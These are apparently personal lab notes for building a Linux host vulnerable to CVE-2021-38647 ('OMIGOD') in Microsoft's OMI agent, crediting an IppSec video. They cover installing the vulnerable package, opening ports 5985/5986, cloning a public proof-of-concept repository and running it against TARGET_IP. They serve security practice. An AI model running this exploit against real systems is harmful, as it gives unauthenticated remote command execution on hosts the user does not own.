# ty ippsec https://www.youtube.com/watch?v=TXqi1BKtcyM

# validate OMI is running
ps -ef | grep omi

# use to see current listening sockets
ss -lnpt

# download vulnerable omi agent, https://github.com/microsoft/omi/releases/tag/v1.6.8-0
sudo su -

# find openssl version 
openssl version

# if OpenSSL 1.0.*
wget https://github.com/microsoft/omi/releases/download/v1.6.8-0/omi-1.6.8-0.ssl_100.ulinux.x64.deb
# if OpenSSL 1.1.*
wget https://github.com/microsoft/omi/releases/download/v1.6.8-0/omi-1.6.8-0.ssl_110.ulinux.x64.deb

# set up listening ports for http and https, HTTP:5985 HTTPS:5986
nano /etc/opt/omi/conf/omiserver.conf

# get missing namespace
wget https://github.com/microsoft/SCXcore/releases/download/v1.6.8-1/scx-1.6.8-1.ssl_110.ulinux.x64.deb

# target is now configured as vulnerable

# get a POC script for the vulnerability
git clone https://github.com/horizon3ai/CVE-2021-38647

# run the vuln
python .\omigod.py -t TARGET_IP -c hostname